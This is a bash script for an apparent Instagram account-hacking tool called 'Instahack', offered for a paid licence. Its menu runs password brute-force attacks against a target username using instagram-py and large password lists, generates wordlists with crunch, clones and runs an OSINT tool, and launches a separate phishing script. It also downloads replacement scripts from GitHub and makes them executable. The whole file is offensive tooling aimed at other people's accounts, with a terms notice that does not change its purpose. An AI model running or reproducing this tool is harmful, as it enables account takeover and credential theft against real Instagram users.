cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
BlueF='\e[1;34m' #Biru
RESET="\033[00m" #normal
orange='\e[38;5;166m'
clear
function UserDistro() {
lnx="Linux"
lsb_release -i >temp/distro.tmp
lsb_release -c >temp/codename.tmp
rlname=$(awk '{print $2}' temp/codename.tmp)
dist=$(awk '{print $3}' temp/distro.tmp)
dist1=$(awk '{print $4}' temp/distro.tmp)
rm -f temp/codename.tmp >/dev/null
rm -f temp/distro.tmp >/dev/null
if [[ "$dist" == "$lnx" ]]; then
dist0="$dist1"
else
dist0="$dist"
fi
}
function CheckInternet() {
clear
wget -q --spider https://hackerwasii.blogspot.com
if [ $? -ne 0 ]; then
echo -e $red [ X ]::[Internet Connection]: OFFLINE!
sleep 1
exit
else
echo -e $okegreen [✔]::[Internet Connection]: CONNECTED!
echo ""
sleep 1
fi
}
function updateVersion() {
path=$(pwd)
if [[ -f "${path}/release" ]]; then
Versi=$(sed -n 1p <"$path/release")
else
echo ""
echo -e "$red""* - Version Control File Not Found"
echo ""
echo -ne "$okegreen""* - Updating Instahack Main Files ....."
rm -f "${path}/instahack.sh" >/dev/null 2>&1
rm -f "${path}/setup.sh" >/dev/null 2>&1
wget https://raw.githubusercontent.com/evildevill/instahack/master/instahack.sh -O "${path}/instahack.sh" >/dev/null 2>&1
wget https://raw.githubusercontent.com/evildevill/instahack/master/setup.sh -O "${path}/setup.sh" >/dev/null 2>&1
wget https://raw.githubusercontent.com/evildevill/instahack/master/release -O "${path}/release" >/dev/null 2>&1
chmod +x "${path}/instahack.sh" >/dev/null 2>&1
chmod +x "${path}/setup.sh" >/dev/null 2>&1
chmod +x "${path}/release" >/dev/null 2>&1
echo ""
clear
echo -e "$orange" "Instahack Has been Updated Successfully..\n Now You can use."
sleep 2
echo ""
clear
exit 1
fi
}
function pswdCheck() {
if [ -f ".password.txt" ]; then
echo ""
Menu
else
echo -e "$orange" "  Licence Not Found..:)"
echo ""
UserPswd
sleep 2.0
fi
}
function UserPswd() {
clear
echo ""
figlet instahack
echo -e "${red}--------------------------------------------"
echo ""
echo -e "${white}[${red}•${white}] Note $cyan   : $orange Licence is Required in Order to use"
echo -e "${white}[${red}•${white}] Price  $cyan : $orange Worth is 15 USD For Lifetime Use"
echo -e "${white}[${red}•${white}] PayPal $cyan : $orange https://paypal.com/hackerwasii"
echo -e "${white}[${red}•${white}] Email $cyan  : $orange wasii@hackerwasii.com"
echo ""
echo -e "${red}--------------------------------------------"
echo ""
read -p $'\e[38;5;166mEnter Licence \e[0;36m: \e[1;37m' pswd
if [[ $pswd == . || $pswd == . ]]; then
echo -e $orange "Checking Licence..."
sleep 2.0
echo -e $orange "Licence Matched..."
sleep 1
clear
echo -e $orange "Redirecting To Instahack...."
sleep 2.0
clear
UserName
else
echo -e $cyan "Licence Not Matched..:)"
sleep 1
exit
fi
}
function UserName() {
echo ""
echo ""
read -p $'\e[1;31m Enter Your Name \e[0;36m: \e[38;5;166m' nme
clear
echo ""
read -p $'\e[1;31m Your Target Name \e[0;36m: \e[38;5;166m' targ
sleep 2.0
clear
echo ""
echo -e $red "Hey, $orange"$nme" $red Important Note  for You.."
echo ""
echo -e $yellow "I shall not use Instahack to:"
echo -e $yellow "(1) upload or otherwise transmit, display or distribute any"
echo -e $yellow "content that infringes any trademark, trade secret, copyright"
echo -e $yellow "or other proprietary or intellectual property rights of any"
echo -e $yellow "person; (2) upload or otherwise transmit any material that contains"
echo -e $yellow "software viruses or any other computer code, files or programs"
echo -e $yellow "designed to interrupt, destroy or limit the functionality of any"
echo -e $yellow "computer software or hardware or telecommunications equipment;"
echo ""
echo -e $yellow "Thank you for all the sourport over the years, the Instahack team thanks you!"
echo -e $yellow "Follow Me On Instagram!!!"
echo ""
echo -e $yellow "[ https://instagram.com/wasii_254 ]"
echo ""
echo -e $yellow "Waseem Akram"
echo -e $cyan "Thanks, For Reading"
echo ""
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] You must agree to our terms and conditions first (Y/n) : \e[0m' option
if [[ $option == Y || $option == y ]]; then
echo ""
echo -e $orange "Thanks For Accepting Our Terms & Conditions.."
echo ""
sleep 1
clear
else
echo ""
echo -e $red "Exiting Have a Nice Day..:)"
echo ""
exit
fi
}
function Menu() {
echo ""
clear
echo ""
figlet instahack
echo -e "${red}--------------------------------------------"
echo ""
echo -e "${white}[${red}•${white}] Author $cyan : $orange Waseem Akram"
echo -e "${white}[${red}•${white}] Github $cyan : $orange github.com/evildevill"
echo -e "${white}[${red}•${white}] YouTube $cyan: $orange youtube.com/HackerWasii"
echo ""
echo -e "${red}--------------------------------------------"
echo ""
echo -e "${white}(${cyan}1${white}) $orange Auto Attack       ${white}(${cyan}2${white}) $orange Insta OSINT"
echo -e "${white}(${cyan}3${white}) $orange Manual Attack     ${white}(${cyan}4${white}) $orange Create Worldlist"
echo -e "${white}(${cyan}5${white}) $orange Phishing Attack   ${white}(${cyan}6${white}) $orange Update"
echo -e "${white}(${cyan}7${white}) $orange About Us          ${white}(${cyan}8${white}) $orange Exit"
echo ""
echo -e "${red}--------------------------------------------"
echo ""
read -p $'\e[38;5;166mSelect Option \e[0;36m: \e[1;37m' opt
echo ""
if [[ $opt == 1 || $opt == 01 ]]; then
AutoAttack
elif [[ $opt == 2 || $opt == 02 ]]; then
cd >/dev/null 2>&1
git clone https://github.com/evildevill/instainfo.git >/dev/null 2>&1
cd instainfo >/dev/null 2>&1
chmod +x * >/dev/null 2>&1
python3 -m venv venv
pip3 install -r requirements.txt
make
read -p $'\e[1;31m Your Target Name \e[0;36m: \e[38;5;166m' instain
cd instainfo >/dev/null 2>&1
python instainfo.py $instain
elif [[ $opt == 3 || $opt == 03 ]]; then
ManualAttack
elif [[ $opt == 4 || $opt == 04 ]]; then
read -p $'\e[1;31m Enter Minimum Value \e[0;36m: \e[38;5;166m' min
read -p $'\e[1;31m Enter Maximum Value \e[0;36m: \e[38;5;166m' max
read -p $'\e[1;31m Enter Keyword \e[0;36m: \e[38;5;166m' keyword
echo -e $green"Please wait it will take some time.. $white"
echo ""
crunch $min $max $keyword -o pass.txt
clear
Menu
elif [[ $opt == 5 || $opt == 05 ]]; then
sleep 2.0
PhishingAttack
elif [[ $opt == 6 || $opt == 06 ]]; then
cd ${path}/core
bash update.sh
elif [[ $opt == 7 || $opt == 07 ]]; then
cd ${path}/core
bash about.sh
elif [[ $opt == 8 || $opt == 08 ]]; then
echo -e $orange "Thanks For Using Instahack. Hope You Enjoyed it...��️"
exit
else
echo
printf "\e[1;93m [>!<] Invalid Selection!\e[0m\n"
sleep 1
echo
fi
exit
}
function AutoAttack() {
clear
echo ""
figlet Auto Attack
read -p $'\e[38;5;166mEnter Your Target Name \e[0;36m: \e[1;37m' targn
echo ""
echo -e $cyan "Select Worldlist $red : $white "
echo -e "${white}[${red}1${white}] From $cyan   : $orange 1k Passwords"
echo -e "${white}[${red}2${white}] From   $cyan : $orange 10k Passwords"
echo -e "${white}[${red}3${white}] From   $cyan : $orange 1M Passwords"
echo -e "${white}[${red}4${white}] From   $cyan : $orange 10M Passwords"
echo ""
read -p $'\e[38;5;166mSelect One \e[0;36m: \e[1;37m' pswdLIST
echo
if [ $pswdLIST = 1 ]; then
instagram-py --username $targn --password-list ${path}/pass/pass1.txt --continue-attack
elif [ $pswdLIST = 2 ]; then
instagram-py --username $targn --password-list ${path}/pass/pass2.txt --continue-attack
elif [ $pswdLIST = 3 ]; then
instagram-py --username $targn --password-list ${path}/pass/pass3.txt --continue-attack
else
echo ""
echo -e "$yellow >>> Exiting..! Bye See You Next Time :) <<<$cyan"
echo ""
sleep 1.0
exit
fi
}
function ManualAttack() {
clear
echo ""
figlet Manual Attack
echo ""
read -p "[#] Enter Your Target Name : " targn
echo ""
read -p "[#] Enter PasswordList Location : " manualpass
echo ""
if [[ $inspass = 0 ]]; then
echo -e "$ylo >>> Exiting..! Bye See You Next Time :) <<<$cyan"
else
instagram-py --username $targn --password-list $manualpass --continue-attack
echo ""
fi
}
function PhishingAttack() {
clear
echo ""
figlet PhishingAttack
echo ""
cd ${path}/emptyphish
bash emptyphish.sh
}
UserDistro
CheckInternet
updateVersion
pswdCheck
UserPswd
UserName
Menu
AutoAttack
ManualAttack
PhishingAttack
